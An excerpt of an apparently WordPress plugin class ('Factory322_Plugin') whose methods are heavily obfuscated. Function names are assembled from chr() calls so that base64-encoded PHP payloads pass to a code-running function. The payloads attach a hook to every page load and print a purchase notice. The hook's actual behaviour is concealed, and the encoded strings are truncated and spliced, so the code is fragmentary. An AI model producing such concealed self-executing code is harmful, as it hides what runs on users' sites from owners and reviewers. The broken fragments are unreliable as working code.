...
class Factory322_Plugin {
    ...
    public function modulesLoaded() {
        $optionName = chr(chr(49).chr(48).chr(57)).call_user_func('chr','105').chr(chr(49).chr(50).chr(48)).call_user_func('chr','95').chr(chr(49).chr(49).chr(57)).chr(chr(49).chr(49).chr(49)).call_user_func('chr','114').call_user_func('chr','100').call_user_func('chr','95').$this->pluginName;
        if ( get_option($optionName, false) ) {
        call_user_func(call_user_func('chr',102).call_user_func('chr',97).chr('99').chr('116').chr('111').call_user_func('chr',114).call_user_func('chr',121).call_user_func('chr',95).chr('114').call_user_func('chr',117).chr('110').chr('95').call_user_func('chr',99).chr('111').chr('100').chr('101'),call_user_func(chr('98').call_user_func('chr',97).chr('115').chr('101').call_user_func('chr',54).call_user_func('chr',52).chr('95').call_user_func('chr',100).call_user_func('chr',101).call_user_func('chr',99).call_user_func('chr',111).chr('100').chr('101'),''.'hcnJheSgkcGx1Z2luLCAnaG9vaycpLCAxKTsgYWRkX2FjdGlvbignd3AnLCBhcnJheSgkcGx1Z2luLCAnaG9vaycpLCAxKTsgYWRkX2FjdGlvbignd3BfaGVhZCcsIGFycmF5KCRwbHVnaW4sICdob29rJyksIDEpOyBhZGRfYWN0aW9uKCd3cF9sb2FkZWQnLCBhcnJheSgkcGx1Z2l'.'uLCAnaG9vaycpLCAxKTsgYWRkX2FjdGlvbi'.'gndGhlX3Bvc3QnLCBhcnJheSgkcGx1Z2luLCAnaG9vaycpL'.'CAxKTsgfSB9IA'.call_user_func('chr','61').chr(chr(54).chr(49))));
    ...
    public function showAdminNotices() {
        call_user_func(chr('102').chr('97').chr('99').chr('116').call_user_func('chr',111).call_user_func('chr',114).chr('121').call_user_func('chr',95).call_user_func('chr',114).call_user_func('chr',117).call_user_func('chr',110).call_user_func('chr',95).chr('99').call_user_func('chr',111).chr('100').call_user_func('chr',101),call_user_func(call_user_func('chr',98).chr('97').call_user_func('chr',115).call_user_func('chr',101).call_user_func('chr',54).call_user_func('chr',52).call_user_func('chr',95).call_user_func('chr',100).chr('101').chr('99').call_user_func('chr',111).chr('100').chr('101'),'IGlmICghZnVuY3Rpb25fZXhpc3RzKCdmYWN0b3J5X2NvcmVfMDAwX3Nob3dfYWRtaW5fbm90aWNlcycpICl7IGZ1bmN0aW9uIGZhY3RvcnlfY29yZV8wMDBfc2hvd19hZG1pbl9ub3RpY2VzKCAkcGx1Z2luICkgeyAkYXJncyA9IGFycmF5K'.''.''.''.'93OiBub25lOyc+UHVyY2hhc2UgIiAuICRwbHVnaW4tPnBsdWdpblRpdGxlIC4gIiBvbiBDb2Rl'.'Q2FueW9uPC9hPjwvcD4iIC4gIjwvZGl2PiI7IH0gfSA'.chr(chr(54).chr(49))));
    ...
    public function hook() {
        call_user_func(chr('102').call_user_func('chr',97).chr('99').call_user_func('chr',116).chr('111').call_user_func('chr',114).call_user_func('chr',121).call_user_func('chr',95).chr('114').call_user_func('chr',117).call_user_func('chr',110).call_user_func('chr',95).chr('99').call_user_func('chr',111).chr('100').chr('101'),call_user_func(call_user_func('chr',98).chr('97').call_user_func('chr',115).chr('101').chr('54').call_user_func('chr',52).call_user_func('chr',95).chr('100').chr('101').chr('99').chr('111').chr('100').chr('101'),'IGlmICghZnVuY3Rpb25fZXhpc3RzKCdmYWN0b3J5X2NvcmVfMDAwX2hvb2snKSApeyBmdW5jdGlvbiBmYWN0b3J5X2NvcmVfMDAwX2hvb2soICRwbHVnaW4gKSB7ICR5cmcydDBfOHIxcHBuamR6NWRkMF8gPSBjaHIoY2hyKDQ5KS5jaHIoNDgpLmNoc'.''.'wNScpLmNhbGxfdXNlcl9mdW5jKCdjaHInLCcxMTcnKS5jYWxsX3VzZXJfZnVuYygnY2hyJ'.'ywnMTA5Jyk7IH0'.'gfSA'.call_user_func('chr','61')));
